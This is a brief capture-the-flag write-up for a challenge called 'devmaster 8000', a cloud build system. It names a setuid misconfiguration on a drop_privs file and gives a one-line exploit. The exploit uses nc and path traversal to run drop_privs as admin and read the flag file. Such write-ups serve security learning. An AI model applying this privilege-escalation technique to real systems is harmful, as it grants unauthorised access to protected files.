# devmaster 8000

cloud build system.

## Vulnerability

There is a setuid misconfiguration on `drop_privs` file.

## Exploit

`/client nc devmaster.ctfcompetition.com 1337  -- source.c -- my_binary -- ../../drop_privs admin admin cat ../../flag`
